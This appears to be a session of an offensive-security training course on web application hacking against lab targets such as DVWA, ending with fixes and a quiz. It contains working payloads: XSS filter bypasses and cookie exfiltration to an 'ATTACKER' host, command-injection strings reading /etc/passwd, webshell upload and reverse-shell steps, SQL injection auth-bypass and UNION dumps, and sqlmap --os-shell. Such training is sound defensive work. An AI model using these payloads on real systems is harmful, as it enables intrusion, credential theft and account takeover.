    Session 8 — Web Application Hacking & SQL Injection

    The front door to almost every network. Learn the web the way an attacker reads it — then the injection flaws that turn a text box into a shell.

    In Session 7 you analysed malware — but how did it get in? Overwhelmingly through the web application: a login form, an upload field, a search box. Web apps are exposed to the whole internet by design, which makes them the number-one initial-access vector you will ever defend.

    This session teaches the web the way an attacker sees it: intercept every request with Burp, map the attack surface (OWASP Top 10), then work the injection flaws one by one — XSS, file upload to shell, command injection, IDOR, and the crown jewel, SQL injection — from a manual ' OR 1=1 -- auth bypass all the way to sqlmap. Every attack ends where the defender lives: the access log, a detection rule, and the one fix that closes it.

    ⏱ ~4 hours◆ 11 mini-labs + 5 attack labs🔑 Deliverable: a web-app pentest finding report
    How this session runs

    Every concept ends with a ▶ Prove it mini-lab you can run against DVWA or PortSwigger's Web Security Academy. The stepped diagrams play — watch a request cross the proxy, a stored XSS fire, an auth bypass slip through. Attack it, watch it, then read the log it left.

    S08 · P02Recap · where this fits⏱ 4 min

    How the Malware Got In

    Session 7 was the payload after it landed. Session 8 is the door it came through — the web app that faces the entire internet.

    The thread so far

    You have exploited services (S5), escalated (S6), and analysed the malware (S7). But most real intrusions do not start with an exploit against a patched service — they start with a web application flaw: a form that trusts its input. The web app is the biggest, most exposed attack surface an organisation has, and injection is how it falls. Today you learn to find and prove those flaws, then to catch them.

    Why the web app first

    The web app is the internet-facing door. Injection flaws let an attacker skip the exploit and walk in through a form. Learn to find them as an attacker, and you know exactly what to log and block as a defender.

    S08 · P03Why · the biggest surface⏱ 5 min

    Why the Web App Is the Center of the Attack Surface

    It is exposed to everyone, it handles the data, and its flaws are cheap to find. Here is why this is the highest-yield offensive skill.

    Exposed by design

    A firewall hides internal services; a web app is meant to be reached by the whole internet. That exposure, multiplied by custom code written under deadline, is why web application flaws dominate breach reports and bug-bounty payouts. The OWASP Top 10 is the industry's ranked list of what goes wrong — and injection and broken access control sit at the very top.

    OWASP #1–#3Broken Access Control, Cryptographic Failures, and Injection lead the Top 10 — the classes this session covers
    Every apphas inputs, and every input is a test surface — the rule: test all of them
    HTTPevery web attack is a request — which makes it visible in logs and blockable at a WAF
    Real-world anchor — SQL injection, still

    SQL injection is decades old and still breaches production systems — from retail giants to government portals — because one line of code ("...WHERE user='" + input + "'") concatenates user input into a query. The fix has existed for just as long (parameterised queries). The gap between "known fix" and "still shipping the bug" is exactly why you must be able to find it.

    Why you specifically

    Custom code, public exposure, repeatable flaws. Web apps are where attackers get in and where defenders have the clearest signal. Master this and you cover the most common initial-access vector on both sides.

    S08 · P04Method · the stack⏱ 7 min

    The Web Stack — Client, Server, Database

    You cannot attack what you cannot picture. Map the three tiers and where trust is misplaced between them.

    Three tiers, one trust problem

    A web application is three layers: the client (your browser runs HTML/JavaScript), the server (PHP/Python/Node runs the logic), and the database (SQL stores the data). Almost every web vulnerability is a failure to distinguish data from code as it crosses one of those boundaries. Click each tier.

    ▶ Prove it — see the three tiers in one request
    # In your browser dev-tools Network tab, submit any login form and watch:
#   CLIENT  -> the JS that runs and the request it builds
#   SERVER  -> the response (status, headers, Set-Cookie)
#   (DB is invisible from outside — but the response reveals when your input reached it)
curl -i -X POST -d 'user=admin&pass=x' http://TARGET/login   # the raw request/response

    You should see: one form submission crosses all three tiers. The attacker's whole job is finding the boundary where data is mistaken for code — and each boundary has its own attack.

    Data vs code, at every boundary

    Every web vuln is data treated as code. XSS at the browser, injection at the OS or database, trust at the server. Picture the three tiers and each attack has an obvious home.

    S08 · P05Tool · intercept everything⏱ 7 min

    HTTP & Burp Suite — See Every Request

    The web speaks HTTP, and Burp sits in the middle of the conversation. If you cannot intercept and edit a request, you cannot test one.

    The proxy is the whole game

    Web testing is request-editing. The browser hides most of what it sends; Burp Suite is a proxy that sits between your browser and the server so you can intercept, read, modify, and replay every request. Client-side validation (a dropdown, a length limit, disabled JS) evaporates the moment you edit the request in Burp — because the server only sees the HTTP you send.

    ▶ Prove it — intercept and modify one request
    # 1. Set your browser proxy to 127.0.0.1:8080 (Burp), turn Intercept ON.
# 2. Submit any form on DVWA.
# 3. In Burp, change a parameter value, then Forward.
# 4. Right-click -> Send to Repeater to replay and tweak it freely.
# The server acts on YOUR edited request — client-side limits are gone.

    You should see: you changed what the server received after the browser was done with it. That single ability — edit the request in flight — is what makes every attack in this session possible.

    Own the request

    The server only sees the HTTP you send. Burp lets you send anything, so client-side validation is never a security control. Intercept, edit, replay — that reflex underlies XSS, upload, injection, all of it.

    S08 · P06Tool · map before you attack⏱ 7 min

    Web Enumeration — Find the Hidden Surface

    An app is bigger than its links. Before attacking, map its directories, parameters, and endpoints — you cannot test what you cannot see.

    Attack surface = what you can find

    The visible site is a fraction of what is there: admin panels, backup files, old endpoints, API routes, and parameters not shown in any link. Content and parameter discovery brute-forces these from wordlists, turning an unknown app into a mapped one. More surface found = more places to test — enumeration is the multiplier on everything that follows.

    Web enumeration (gobuster / ffuf / ParamSpider) — the 7-part frame

    What it isContent-discovery tools (gobuster, ffuf, dirb, feroxbuster) brute-force paths from a wordlist; parameter/subdomain tools (ParamSpider, Sublist3r, Amass) find inputs and hostnames.
    Why it existsTo reveal the endpoints, files, and parameters the app never links to — the hidden attack surface where the untested, vulnerable code usually lives.
    The methodStart with robots.txt and the sitemap, then brute-force directories with a good wordlist, note interesting extensions (.php, .bak, .zip), and discover parameters to feed the injection tests.
    Real syntax
    gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
ffuf -u http://target/FUZZ -w wordlist.txt -e .php,.bak -mc 200,301,403
curl -s http://target/robots.txt          # free hints, always check
sublist3r -d target.com                    # subdomains = more apps
    Read the outputStatus codes guide you: 200 exists, 301/302 redirect (often a real dir), 403 exists-but-forbidden (interesting!), 401 auth-required. A 403 on /admin is a finding, not a dead end.
    What it feedsEach discovered endpoint and parameter becomes a test target for the attacks in this session (XSS, injection, IDOR); admin/backup files feed direct exploitation.
    SOC flipExtremely loud. Hundreds/thousands of 404s from one source in seconds is the classic content-discovery signature — a web-server access-log rule (high 404 rate per IP) or WAF catches it instantly. On a real engagement you throttle and use a targeted wordlist.
    ▶ Prove it — map hidden surface with gobuster
    gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt
# watch for:  /admin (403), /uploads (301), /config.php.bak (200)
curl -s http://TARGET/robots.txt   # often lists the paths they wanted hidden

    You should see: you turned a handful of visible links into a full map of directories and files — including the ones the developers assumed nobody would find. Every hit is a new place to test.

    Enumeration multiplies everything

    You can only test what you find. Map the directories, files, and parameters first; the vulnerable code is almost always in the endpoint nobody linked to. It is also loud — the same activity is a top web-log detection.

    S08 · P07Method · OWASP Top 10⏱ 6 min

    The Web Attack Surface — What Actually Goes Wrong

    Five attack families cover almost everything you will test today. Learn the map, then work each one in turn.

    A map of this session

    The OWASP Top 10 ranks web risks; the five below are the ones you can find and prove by hand, and they are the spine of this session. Each is a different boundary where the app trusts input it should not. Click each — what it is, the input it abuses, and the page where you attack it.

    ▶ Prove it — pick the family from the symptom
    # Match the observation to the family:
#  'my input appears verbatim in the page'        -> XSS (test <script>)
#  '?id=123 in the URL shows MY record'           -> IDOR (try 124)
#  'a field feeds a ping/lookup tool'             -> command injection (; id)
#  'a login form / any DB-backed input'           -> SQL injection (' OR 1=1 --)
#  'an upload field accepts files'                -> file upload (try .php)

    You should see: the symptom points straight at the family and its first test payload. This map is your triage for any web target — and the running order of the session.

    Five families, one theme

    Wherever the app trusts input, there is an attack. Browser (XSS), server (upload, cmd-injection), access control (IDOR), database (SQLi). Learn the five and you can test any web app methodically.

    S08 · P08Attack · cross-site scripting⏱ 7 min

    XSS — Your JavaScript in Their Browser

    The app hands your input to another user's browser as code. Learn the three flavours and the one that scales to every visitor.

    Injection at the client tier

    Cross-Site Scripting is injection into the browser: the app puts your input into a page without encoding it, so the browser runs it as JavaScript — in the victim's session, with their cookies. The impact ranges from a harmless alert(1) proof to full account takeover via cookie theft. The three types differ in where the payload lives. Click each.

    ▶ Prove it — prove reflected XSS in one field
    # On DVWA (XSS Reflected, Low) put this in the input and submit:
<script>alert(document.domain)</script>
# if a popup shows the domain, the app ran YOUR script in the page.
# escalate the proof (do NOT do this off your lab):
<script>alert(document.cookie)</script>   # shows the session cookie is reachable

    You should see: the alert proves the browser executed input the app should have encoded. document.cookie being reachable is the leap from "popup" to "session theft" — which is why XSS is high-impact, not a toy.

    Encode on output

    XSS is unencoded output. Stored is worst (fires for everyone), reflected needs a click, DOM lives in the JS. The fix is always the same — encode user data when writing it into a page — which is the defence you will map later.

    S08 · P09Attack · the scaling flow⏱ 7 min

    Stored XSS — One Payload, Every Visitor

    Watch a stored payload plant itself once and fire for everyone who loads the page — then how attackers slip past naive filters.

    Why stored XSS scales

    Reflected XSS needs you to deliver a link to each victim. Stored XSS is planted once — in a comment, a name, a support ticket — and the app serves it to every visitor, admins included, with no action on their part. Watch the flow, then see why a blocklist of <script> does not save you.

    ▶ Prove it — beat a naive <script> filter
    # If the app strips the literal string 'script', these still fire — no <script> needed:
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<body onload=alert(1)>
# case/encoding tricks:  <ScRiPt>alert(1)</ScRiPt>   %3Cscript%3E...

    You should see: blocklisting one tag or word is not a defence — there are dozens of ways to run JS without <script>. This is exactly why the real fix is output encoding, not input blocklists.

    Stored = automatic + everyone

    Plant once, fire for all. Stored XSS needs no victim action and hits admins too, which is why it is the high-severity flavour. And blocklist filters lose — encode output and use a Content-Security-Policy instead.

    S08 · P10Attack · web bug to RCE⏱ 7 min

    File Upload — The Fastest Path to a Shell

    When an app stores an executable you uploaded, you own the server. Watch a webshell go from upload field to remote code execution.

    Upload code, then run it

    An upload feature becomes remote code execution when two things are true: the app lets you upload a server-executable file (e.g. .php), and it stores it somewhere the web server will run it. Browse to the uploaded file and its code executes on the server — a shell, no memory-corruption exploit required. This is the web's shortcut to the Session 5 foothold.

    ▶ Prove it — test whether an upload filter is real
    # Try, in order, until one is stored AND executes:
#  1. shell.php                    (no filter?)
#  2. shell.php.jpg / shell.pHp     (extension tricks)
#  3. shell.php + Content-Type: image/jpeg  (spoof MIME in Burp)
#  4. add magic bytes: 'GIF89a;' then the PHP  (content-sniff bypass)
# then browse to it:  curl 'http://TARGET/uploads/shell.php?c=id'

    You should see: if any variant lands in an executable path and runs, the "filter" was client-side or trivially spoofable. A real defence checks the true type server-side, renames the file, and stores it outside the webroot.

    Executable + reachable = RCE

    A stored, runnable upload is game over. The fix is a server-side allow-list of types, renaming, storage outside the webroot, and execution disabled in the upload dir — break any one link and the shell dies.

    S08 · P11Attack · input to the OS⏱ 7 min

    Command Injection — Your Input Becomes a Shell Command

    When an app builds an OS command from your input, a semicolon runs your command too. Direct code execution, no upload needed.

    Injection at the OS boundary

    Some apps shell out to the operating system — a "ping this host" tool, an image converter, a PDF generator. If the app concatenates your input into that command, you add your own: ping 8.8.8.8; cat /etc/passwd runs both. Same root cause as SQLi and XSS — data treated as code — but the interpreter here is the shell, so you get direct server execution.

    ▶ Prove it — test a field for command injection
    # In any field that looks like it runs a system command (ping, nslookup, convert), try:
8.8.8.8 ; id
8.8.8.8 && whoami
8.8.8.8 | cat /etc/passwd
`id`      $(id)
# blind? use a delay or a callback:
8.8.8.8 ; sleep 5      # 5s delay = injection even with no visible output

    You should see: if id output appears — or the response takes 5 seconds — your input reached the shell. The sleep trick proves blind command injection when you can't see the output, exactly like blind SQLi later.

    Never build commands from input

    A shell metacharacter turns one command into two. The fix is to avoid shelling out with user input at all — use language APIs or strictly parameterised calls, and validate input against an allow-list.

    S08 · P12Attack · broken access control⏱ 6 min

    IDOR — Change the Number, See Their Data

    OWASP's #1 risk needs no payload at all. If the app trusts an id you send, you read records that are not yours.

    The flaw with no exploit

    Insecure Direct Object Reference is the simplest attack in the session and the highest-ranked risk on the OWASP list (Broken Access Control). The app exposes a reference to an object — ?id=123, /invoice/5001.pdf, a hidden account field — and checks that you are logged in, but not that the object is yours. Change the value, get someone else's data. Click each idea.

    ▶ Prove it — test for IDOR in one request
    # Log in as your own user, capture a request that fetches YOUR data:
GET /profile?id=1337 HTTP/1.1
# in Burp Repeater, change only the id:
GET /profile?id=1338 HTTP/1.1
# got someone else's profile back? that's IDOR. Automate the sweep with Intruder.

    You should see: if id 1338 returns data that is not yours, the app authenticated you but never authorised the record. One changed number is the entire exploit — which is why broken access control tops the OWASP list.

    Authn is not authz

    Logged in ≠ allowed. IDOR is a missing per-object ownership check. The fix is server-side authorization on every object access — and using unguessable references does not replace it, it only hides it.

    S08 · P13Hands-on · everyone · attack⏱ 16 min

    Lab A — Reflected and Stored XSS on DVWA

    Prove both flavours on a safe target: bounce a script off a search box, then plant one that fires for every visitor.

    Two XSS, one lab

    You will exploit reflected XSS (fires for whoever clicks your link) and stored XSS (fires for everyone), then raise DVWA's security level to watch a naive filter and defeat it. Everything is on your own DVWA — never point these payloads at a site you do not own.

    1. Reflected — DVWA → XSS (Reflected), Low. Put a payload in the name field: 
      <script>alert(document.domain)</script>
# the popup proves your JS ran in the page. Now craft the delivery URL:
http://DVWA/vulnerabilities/xss_r/?name=<script>alert(1)</script>

      ✓ Verification

      • The alert fires and the URL carries the payload — anyone who clicks that link runs it. That is reflected XSS and its phishing-style delivery.
    2. Stored — DVWA → XSS (Stored). Submit a guestbook entry containing: 
      <script>alert('stored-'+document.domain)</script>
# now RELOAD the page (or open it as another user) — it fires again, with no link.

      ✓ Verification

      • The payload persisted and executes on every load, for every visitor — the high-severity flavour. Note you did nothing to the second "victim"; the page did.
    3. Beat the filter — raise to Medium (strips <script>) and use an event handler: 
      <img src=x onerror=alert(document.cookie)>
# or:  <svg onload=alert(1)>   /   <ScRiPt>alert(1)</ScRiPt>

      ✓ Verification

      • A blocklist that removes <script> does nothing against onerror — proving why the real fix is output encoding + CSP, not input blocklists.
    4. Weaponise the proof (concept only, on your lab) — show why XSS = account takeover: 
      <script>new Image().src='http://ATTACKER/c?='+document.cookie</script>
# the session cookie is sent to the attacker -> replay it -> logged in as the victim

      ✓ Verification

      • Cookie exfiltration turns a popup into session hijacking. This is the bridge to Session 9's session-hijacking material — XSS is one way to steal the token.
    You ran code in another context

    XSS executes your code with the victim's privileges. Reflected needs a click, stored needs nothing, and filters that blocklist tags lose. The defender's answer — encode output, set a CSP — comes later; first you had to see it fire.

    S08 · P14Hands-on · everyone · foothold⏱ 16 min

    Lab B — Upload a Webshell, Get a Shell

    Turn an upload field into remote code execution: plant a webshell, defeat a weak filter, and land a foothold on the server.

    From web bug to server foothold

    This is the web's shortcut to Session 5's foothold: no exploit, just an upload the app should not have accepted. You will upload a webshell, bypass a client-side/MIME filter, and run commands — then optionally upgrade to a reverse shell.

    Your own DVWA / lab only

    A webshell is real code execution. Keep it on the isolated lab network and delete the uploaded shell afterward.

    1. Prepare a webshell — a one-liner is enough to prove RCE: 
      echo '' > shell.php
# (or use Kali's PentestMonkey reverse shell: /usr/share/webshells/php/php-reverse-shell.php)

      ✓ Verification

      • A minimal PHP command-runner. If the server executes it, ?c=id runs id on the OS.
    2. Upload it — DVWA → File Upload, Low. Submit shell.php and note the stored path: 
      # DVWA prints:  ../../hackable/uploads/shell.php succesfully uploaded!
# on Medium/High the .php is blocked — bypass in the next step.

      ✓ Verification

      • On Low it uploads directly. Note the path — you need it to reach the shell.
    3. Bypass a filter (Medium checks MIME) — intercept in Burp and spoof the type: 
      # In Burp, on the upload request change:
#   filename="shell.php"   (keep)
#   Content-Type: image/jpeg   (spoof)
# or add magic bytes:  first line 'GIF89a;' then the PHP, name it shell.php

      ✓ Verification

      • Spoofing the MIME (or prepending image magic bytes) slips the PHP past a content check that trusts the client — the filter was never really server-side.
    4. Execute — browse to the uploaded shell and run commands: 
      curl 'http://DVWA/hackable/uploads/shell.php?c=id'
# uid=33(www-data) ...
curl 'http://DVWA/hackable/uploads/shell.php?c=uname+-a'
# upgrade: point php-reverse-shell at a `nc -lvnp 4444` listener for an interactive shell

      ✓ Verification

      • Command output proves RCE. A reverse shell gives you an interactive foothold — and now Sessions 5–6 (upgrade, escalate) take over from the web.
    The web-to-foothold shortcut

    A stored, executable upload is a shell. You bypassed a client-trusting filter and ran code on the server. The chain from here — upgrade, escalate, persist — is exactly Sessions 5–6, reached through a web form.

    S08 · P16Method · how a query works⏱ 7 min

    SQL Fundamentals — The Query Behind the Login

    You cannot inject into a language you cannot read. Learn just enough SQL to see why one quote breaks a login wide open.

    The query is a sentence built from your input

    When you log in, the server builds a SQL sentence and asks the database to run it. The vulnerability is entirely about how it builds that sentence: if it glues your input into the string, your input can change the sentence's meaning. Read the query below and the exploit becomes obvious.

    SQL pieceWhat it does
    SELECT cols FROM tread columns from a table
    WHERE user='x'filter rows by a condition — the login check lives here
    UNION SELECT ...append the results of a second query — the key to data extraction
    -- or #comment: everything after it is ignored — used to cut off the rest of the original query
    ' (single quote)ends a string literal — the character that breaks a naively-built query
    The vulnerable login query

    The server runs: SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'. Your input lands inside the quotes. So what happens if your input contains a quote? You escape the string and the rest of your input becomes SQL logic — that is the entire idea of injection.

    ▶ Prove it — break the query on paper first
    # The app builds:   SELECT * FROM users WHERE user='INPUT' AND pass='INPUT'
# You enter as the username:   ' OR '1'='1' -- 
# The query becomes:
#   SELECT * FROM users WHERE user='' OR '1'='1' -- ' AND pass='...'
#   -> WHERE (false OR true)  -> returns the first row  -> logged in, no password

    You should see: trace it by hand: your quote closes the username string, OR '1'='1' makes the condition always true, and -- comments out the password check. Reading the query is the whole skill — the payload writes itself.

    Injection is escaping the string

    A single quote is the key. If your input sits inside a quoted string that is glued into a query, a ' escapes it and everything after becomes logic. Read the query, find the quote, own the database.

    S08 · P17Attack · the login break⏱ 7 min

    SQL Injection — Bypass the Login

    The classic first SQLi: turn the password check into "always true" and walk in. Watch the query change under your input.

    Injection at the database tier

    You read the vulnerable login query on the last page. Now inject it. By supplying ' OR '1'='1' -- as the username, you close the string, add an always-true condition, and comment out the password check — the database returns a valid row and the app logs you in. Watch it play out.

    ▶ Prove it — bypass a login with one payload
    # In the USERNAME field (password anything), try each until one logs you in:
' OR '1'='1' -- 
' OR 1=1 #
admin' -- 
admin'/*
# each closes the string and neutralises the password check

    You should see: one of these returns a user row and logs you in with no valid password. Which comment style works (-- vs #) hints at the backend DB — useful for the extraction that follows.

    Always-true + comment-out

    Escape the string, force a true condition, comment out the rest. That is the auth-bypass template. It is also the proof the input reaches the query unsanitised — which means you can extract data, not just log in.

    S08 · P18Method · three visibilities⏱ 6 min

    The Three Faces of SQL Injection

    How you extract data depends on what the app shows you. Learn to recognise in-band, blind-boolean, and blind-time targets.

    Classify by what you can see

    Auth bypass is one trick; data extraction is the goal. Your method depends on how much the app reveals. If results come back in the response, you extract fast (in-band). If not, you infer the data one bit at a time from the app's behaviour (blind). Click each.

    ▶ Prove it — detect which type you have
    # 1. In-band?  add a quote and look for an error / try ' ORDER BY 1 -- upward
# 2. Boolean?  compare:  ' AND 1=1 --   (normal page)  vs  ' AND 1=2 --   (different page)
# 3. Time?     ' AND SLEEP(5) --   (reply takes 5s = injectable, blind-time)

    You should see: three quick probes classify the target: visible output = in-band (UNION), differing pages = blind-boolean, a measurable delay = blind-time. The type dictates your extraction technique for the rest of the attack.

    Method follows visibility

    See the data → UNION it out. See only behaviour → infer it. In-band is fast, blind is patient, time-based always works. Same vulnerability — the app's verbosity picks your technique.

    S08 · P19Attack · dump the database⏱ 7 min

    UNION-Based SQLi — Dump the Whole Database

    When results are visible, UNION lets you append your own query and read any table. Watch the four-step extraction.

    Append your query to theirs

    UNION SELECT joins the results of a second query onto the first, so the app displays your data where it meant to show its own. The method is mechanical: find the column count, find which columns display, then select from information_schema to map the database and dump the credentials. Watch it.

    ▶ Prove it — walk the UNION method on DVWA (Low)
    ' ORDER BY 2 -- -              # 2 columns? (error at 3 confirms)
' UNION SELECT 1,2 -- -           # see which columns print
' UNION SELECT table_name,NULL FROM information_schema.tables -- -
' UNION SELECT user,password FROM users -- -   # dump creds

    You should see: four requests take you from "there is an injection" to "here are all the usernames and password hashes." The information_schema step is what makes it work on a database you have never seen.

    Count, confirm, map, dump

    UNION extraction is a fixed four-step recipe. Column count → visible columns → schema from information_schema → dump. Learn the recipe once and it works on any in-band target.

    S08 · P20Attack · infer without output⏱ 7 min

    Blind SQLi — Extract Data You Cannot See

    When the app shows nothing, you ask the database yes/no questions and read the answers from its behaviour. Slow, mechanical, unstoppable.

    Twenty questions with the database

    Blind injection has no visible output — but the app still behaves differently for a true vs a false condition (a different page, or a delay). So you extract data one yes/no question at a time: "is the first character of the admin password greater than 'm'?" Narrow it down, move to the next character, repeat. Tedious by hand, instant with a tool — but you must understand it to trust the tool.

    ▶ Prove it — confirm blind SQLi with a timing probe
    # If nothing is ever shown, prove injection by controlling the response time:
' AND SLEEP(5) -- -              # reply takes ~5s  = injectable
' AND IF(1=1,SLEEP(5),0) -- -     # true branch delays
' AND IF(1=2,SLEEP(5),0) -- -     # false branch is fast
# the delay difference IS the data channel

    You should see: the 5-second delay on the true condition and instant reply on the false one is a working yes/no oracle — enough to extract any value, blind. This is precisely what sqlmap automates next.

    Behaviour is a data channel

    No output is not no injection. A differing page or a controllable delay lets you infer any value bit by bit. It is slow by hand — which is exactly why the next tool exists.

    S08 · P21Tool · automate the extraction⏱ 7 min

    sqlmap — Automated SQL Injection

    The tool that does the tedious part perfectly. But it only helps if you understand the manual attack it is automating.

    Automate what you now understand

    You have done column-counting and blind bit-inference by hand — slow and error-prone. sqlmap automates all of it: it detects the injection, identifies the DBMS, and extracts databases, tables, and rows, including the blind and time-based cases you would never finish manually. Because you understand the manual method, you can drive it precisely and trust its output.

    sqlmap — the 7-part frame

    What it isAn automated SQL-injection detection and exploitation tool. Give it a request; it finds injectable parameters, fingerprints the DBMS, and extracts data using in-band, blind-boolean, and time-based techniques.
    Why it existsTo do the mechanical, high-volume part — column counts, thousands of blind yes/no requests, DBMS-specific syntax — perfectly and fast, so the analyst focuses on scope and findings.
    The methodCapture a real request (Burp → save to a file), point sqlmap at it, and escalate scope gradually: confirm → list databases → tables → dump the interesting table. Feed it the whole request so it keeps your session/cookies.
    Real syntax
    sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -r request.txt --batch            # from a saved Burp request (keeps cookies)
sqlmap -r request.txt -D appdb --tables
sqlmap -r request.txt -D appdb -T users --dump
sqlmap -r request.txt --os-shell         # when the DBMS allows OS command exec
    Read the outputsqlmap reports the injectable parameter, the technique (B/E/U/T/S) and the DBMS, then prints extracted tables/rows. --dump shows the data; it even offers to crack hashes it recognises.
    What it feedsDumped credentials go to hashcat (S4) and to lateral movement; --os-shell is a direct foothold (S5–S6); the finding goes in the report.
    SOC flipExtremely loud. sqlmap sends a large volume of probing requests with tell-tale payloads and a default User-Agent — a WAF or an access-log rate/pattern rule flags it immediately. On a real test you tune --delay, --random-agent, and tamper scripts.
    ▶ Prove it — let sqlmap confirm and enumerate
    sqlmap -u 'http://DVWA/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=...; security=low' --batch --dbs
# then narrow:
sqlmap -u '...id=1...' --cookie='...' -D dvwa --tables
sqlmap -u '...id=1...' --cookie='...' -D dvwa -T users --dump

    You should see: sqlmap reproduces your manual UNION/blind extraction in seconds and dumps the users table — but you can read its output critically only because you did it by hand first. The tool is a force multiplier, not a substitute for understanding.

    Understand first, automate second

    sqlmap is fast because you are slow by hand. Manual method builds the judgement; the tool provides the speed. Drive it with a real request, escalate scope deliberately, and remember how loud it is.

    S08 · P26Defensive · the fixes⏱ 6 min

    Countermeasures — One Fix Per Flaw

    Every attack today has a known, specific fix. Learn the mapping so your report ends in action, not just alarm.

    Named flaw, named fix

    Web vulnerabilities are well-understood, which means the remediations are precise — and mostly about the same principle: never trust input, and separate data from code. Parameterise queries, encode output, validate uploads, check authorization. Learn the one-to-one mapping and you can close every finding you wrote.

    AttackThe one primary fixWhy it works
    SQL injectionParameterised queries / prepared statementsinput is sent as data, never parsed as query logic — the quote can no longer escape
    XSSOutput encoding (context-aware) + Content-Security-Policyuser data is rendered as text, not markup; CSP blocks inline/injected script
    File uploadserver-side type allow-list, rename, store outside webroot, disable execeven a malicious file cannot be executed by the web server
    Command injectionavoid shelling out; use language APIs / strict allow-list argsinput never reaches a shell to be interpreted
    IDORserver-side authorization on every object accessownership is checked per request — guessing an id gains nothing
    Allinput validation, least-privilege DB/app accounts, WAF, code reviewdefence in depth — each layer limits what a missed bug can do
    ▶ Prove it — see the fix that ends SQLi
    # VULNERABLE (concatenation — input becomes logic):
#   query = "SELECT * FROM users WHERE user='" + input + "'"
# FIXED (parameterised — input is bound as data):
#   cur.execute("SELECT * FROM users WHERE user=%s", (input,))
# now ' OR '1'='1 is searched for as a literal username — and simply not found

    You should see: the parameterised version sends your payload to the database as a value, so ' OR '1'='1 becomes a username to look up, not logic to run. One API change closes the most impactful web flaw there is.

    Separate data from code

    Every fix is the same idea. Parameterise, encode, validate, authorize — each keeps user input as data. A WAF buys time, but the real fix is in the code, and your report should say exactly which line.

    S08 · P28Assess · 6 questions⏱ 10 min

    Knowledge Check

    Six questions across the session. Answer before you reveal — each explains the reasoning, not just the letter.

    Q1Why is client-side input validation never a security control?

    • It is too slow to be effective
    • Browsers disable it by default
    • An attacker can edit the request in a proxy after the browser, so the server sees unvalidated input
    • It only works over HTTPS

    Q2Why is stored XSS more dangerous than reflected XSS?

    • It runs on the server instead of the browser
    • It fires automatically for every visitor, with no link to click
    • It cannot be filtered
    • It only affects administrators

    Q3An app lets a logged-in user change ?id=123 to ?id=124 and see another user's record. What is the flaw?

    • SQL injection
    • Cross-site scripting
    • Weak authentication
    • IDOR — missing per-object authorization (broken access control)

    Q4Why is the single quote (') the key character in classic SQL injection?

    • It ends the string literal, so the rest of the input is parsed as SQL logic
    • It is a SQL comment
    • It encrypts the query
    • It is required by the UNION keyword

    Q5An injectable parameter returns no data and no errors, but ' AND SLEEP(5)-- delays the response by 5 seconds. What can you do?

    • Nothing — without visible output SQLi is impossible
    • Only bypass the login, never extract data
    • Extract data blind, inferring each bit from the timing (time-based blind SQLi)
    • Only read error messages

    Q6What is the primary fix that definitively stops SQL injection?

    • A web application firewall (WAF)
    • Parameterised queries / prepared statements
    • Escaping single quotes in input
    • Hiding database error messages
    Score yourself

    5–6 right: attack a Juice Shop or PortSwigger lab next. 3–4: re-read the SQLi and XSS pages. <3: rewatch the injection flow diagrams — the data-vs-code idea anchors the whole session.

    Session 8 — What You Keep

    Ten things that outlast any single app or tool. The web changes; these principles do not.

    The durable core

    You saw the web as three tiers, intercepted every request, and worked each injection family to impact — then turned all of it into detections and a report. Tools and frameworks change; the principle — the app trusts input it should not, so separate data from code — is permanent.

    1. Every web vuln is data treated as code. Browser (XSS), OS (cmd-injection), database (SQLi) — same root cause, different interpreter.
    2. The server only sees the HTTP you send. Client-side validation is never security; own the request with Burp.
    3. Enumeration multiplies everything. You can only test what you find — map directories, files, and parameters first.
    4. Stored XSS fires for everyone. No click, admins included; blocklists lose, output encoding + CSP win.
    5. A stored, executable upload is a shell. The web's shortcut to a Session-5 foothold.
    6. IDOR: authn ≠ authz. Logged in is not allowed; check ownership per object, server-side.
    7. A single quote owns the database. Read the query, find where input lands, escape the string.
    8. Method follows visibility. See data → UNION; see only behaviour → blind boolean/time. No output is not no injection.
    9. Understand before you automate. sqlmap is fast because the manual method is slow — do it by hand once so you can trust the tool.
    10. Every payload is a log line. Web attacks are HTTP — detectable in the access log and WAF; the fix is parameterise, encode, validate, authorize.

    Separate data from code, and never trust input. Say that about any web feature and you can predict its vulnerability and its fix — on both sides of the engagement.
